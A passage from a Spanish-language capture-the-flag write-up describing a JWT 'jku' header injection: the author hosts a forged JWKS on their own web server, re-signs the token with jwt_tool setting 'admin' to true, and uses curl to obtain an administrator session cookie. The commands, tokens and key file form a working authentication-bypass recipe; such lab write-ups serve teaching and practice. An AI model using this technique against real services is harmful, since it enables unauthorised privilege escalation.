eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.txHOmL-OX4aBEiUZrPxsJUitE5COI7WY7uhgbkSbngcV2P8IzvRyddTB6c9pjYvXwZgZ9gbN3iyg0twWk3wVsw7Ykx8PFf6ctUd5k_gChXAgFMbIy0MGhPke3JYPGIC4iL40kgSuyoFeQLofxQYKHMXm3EolLX5Dd3N64oXFWnSt6CLxFyr0Pn9gmWnjb_-Ei54__gPdL7U4YMwO4RQkF5G_lc7drZrirRokq5w67DiPJykBoYl-gSrYYxZSWQI3d0qZ4yLPDPRQXkwd3p54txbEqOlvGk3wfIfYXToj8-5oV5FHRcL8zP83LUJBlgEsVK9SdN8P9f-fKzRF1BJY9w
```

Inspeccionamos el JWT con jwt_tool:

```bash
jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.txHOmL-OX4aBEiUZrPxsJUitE5COI7WY7uhgbkSbngcV2P8IzvRyddTB6c9pjYvXwZgZ9gbN3iyg0twWk3wVsw7Ykx8PFf6ctUd5k_gChXAgFMbIy0MGhPke3JYPGIC4iL40kgSuyoFeQLofxQYKHMXm3EolLX5Dd3N64oXFWnSt6CLxFyr0Pn9gmWnjb_-Ei54__gPdL7U4YMwO4RQkF5G_lc7drZrirRokq5w67DiPJykBoYl-gSrYYxZSWQI3d0qZ4yLPDPRQXkwd3p54txbEqOlvGk3wfIfYXToj8-5oV5FHRcL8zP83LUJBlgEsVK9SdN8P9f-fKzRF1BJY9w
```

Observo:

- alg: RS256 (firma asimétrica)
- jku: http://idp.atnascorp/.well-known/jwks.json
- kid: idp-key-2025
- admin: false

El parámetro jku indica que la clave pública se obtiene desde una URL externa.  
Esto sugiere una posible explotación mediante inyección del parámetro jku (JWKS spoofing).

Las pistas indican que puedo hostear archivos en:

http://paulweb.neighborhood/

Me muevo al directorio correspondiente:

```bash
cd ~/www
ls -la
```

Creo un archivo de prueba:

```bash
nano jwks.json
```

Escribo contenido simple para testear y luego verifico acceso:

```bash
curl http://paulweb.neighborhood/jwks.json
```
Si responde correctamente, puedo usar esta ubicación para alojar mi JWKS maliciosa.

Ejecuto jwt_tool en modo exploit:

```bash
jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.txHOmL-OX4aBEiUZrPxsJUitE5COI7WY7uhgbkSbngcV2P8IzvRyddTB6c9pjYvXwZgZ9gbN3iyg0twWk3wVsw7Ykx8PFf6ctUd5k_gChXAgFMbIy0MGhPke3JYPGIC4iL40kgSuyoFeQLofxQYKHMXm3EolLX5Dd3N64oXFWnSt6CLxFyr0Pn9gmWnjb_-Ei54__gPdL7U4YMwO4RQkF5G_lc7drZrirRokq5w67DiPJykBoYl-gSrYYxZSWQI3d0qZ4yLPDPRQXkwd3p54txbEqOlvGk3wfIfYXToj8-5oV5FHRcL8zP83LUJBlgEsVK9SdN8P9f-fKzRF1BJY9w -X s -ju http://paulweb.neighborhood/jwks.json -T
```

Durante el proceso interactivo:

1. Modifico el header:
   - Cambiamos el valor de jku por:
     http://paulweb.neighborhood/jwks.json

2. Modificamos el kid:
   - Cambiamos a "kid": "jwt_tool"

3. Modificamos el payload:
   - Cambiamos "admin": false → true


La herramienta genera:

- Un nuevo JWT firmado
- Una JWKS guardada en:
  /home/paul/.jwt_tool/jwttool_custom_jwks.json

Nuevo token: 
```bash
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJqd3RfdG9vbCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.KQM826XXcht7qBmhBc-aW9oZweaFAZ2DeRQK9YLPRnoT3gFcQz5pCZ9o8FLKAyDUovUP7NxEeEAxaQwJaRHdHkOAM3HXrK-kk-T7UXvmuhXDMHjBM48BqrpYsxIV_qrJ2xjZTkAL16PgI40goAyX4nknvZQvyJldiT-GvCDLoWej0qIe-v66BBseqzLBR7Tr3WvrPUhQX2MG1J13k9Fk2CWGXhmdVmr82hh89VhD-t-YW0JakuXmsC_MEXyf-XGlyFE2IfBPPXxnpdQnLsTvITr5CkfD6TMBwqD0RgiM87jturYwxMmjXR0J8JwHfHRVmXQO4vNcNuVRevwWxGdsHQ
```

Copiamos el contenido generado:

```bash
cat /home/paul/.jwt_tool/jwttool_custom_jwks.json
```
```bash
{
    "keys":[
        {
            "kty":"RSA",
            "kid":"jwt_tool",
            "use":"sig",
            "e":"AQAB",
            "n":"tchOVdXUg9T_HV2f9TVZeoH3G2uB243yAa6Hh7RsyeOy1tAs-OEnD1_5TWrljY-RqoSfoEjbE38rtVLp_weDfroHn8I-I9lGuAA-wDI70sOTm4tSSDuwD9VBFmXI-dFwsTN446yRJagaZP4ZgfPoreOL9bpfL_7HxPOJZ14z2ZJZaP-7hr1HSasyTkkRG3u4pylgoRUu2ZUxWhqNg1A7e1YNUrtlqagooFxGYkZBXbBXJbHdMLn-PSs3tc3pWQEQHPAYBSFHnCzyTEOFQOixh-OQq3KyL5sHKvOWUhTyO2USOmJHLYUbCEd6_DfrcR4P5EctwTlTEU1ssXONGgxHAQ"
        }
    ]
}
```

Pegamos ese contenido dentro del archivo:

```bash
nano ~/www/jwks.json
```

Ahora el servidor local expone nuestra clave pública.

Probamos el nuevo JWT:
```bash
curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9wYXVsd2ViLm5laWdoYm9yaG9vZC9qd2tzLmpzb24iLCJraWQiOiJqd3RfdG9vbCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc3MjQ4OTQ5NCwiZXhwIjoxNzcyNDk2Njk0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6dHJ1ZX0.KQM826XXcht7qBmhBc-aW9oZweaFAZ2DeRQK9YLPRnoT3gFcQz5pCZ9o8FLKAyDUovUP7NxEeEAxaQwJaRHdHkOAM3HXrK-kk-T7UXvmuhXDMHjBM48BqrpYsxIV_qrJ2xjZTkAL16PgI40goAyX4nknvZQvyJldiT-GvCDLoWej0qIe-v66BBseqzLBR7Tr3WvrPUhQX2MG1J13k9Fk2CWGXhmdVmr82hh89VhD-t-YW0JakuXmsC_MEXyf-XGlyFE2IfBPPXxnpdQnLsTvITr5CkfD6TMBwqD0RgiM87jturYwxMmjXR0J8JwHfHRVmXQO4vNcNuVRevwWxGdsHQ
```

Si todo está correcto, obtenemos una cookie de sesión válida.

Set-Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aaYPkA.yKvAzRkhBXZCFns9HK-PAv7VTjs

Usamos la cookie devuelta:

```bash
curl -H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aaYPkA.yKvAzRkhBXZCFns9HK-PAv7VTjs' http://gnome-48371.atnascorp/diagnostic-interface
```

Accedemos al panel con privilegios de administrador.

En el log del sistema observamos:

Firmware Update available: refrigeration-botnet.bin  
Firmware update downloaded.

![identityProviderCompleto](image%20copy%2050.png)

## Resultado

El nombre del firmware instalado es:

refrigeration-botnet.bin

Escalé privilegios y consegui el nombre del firmware instalado, por lo que el desafio está completado.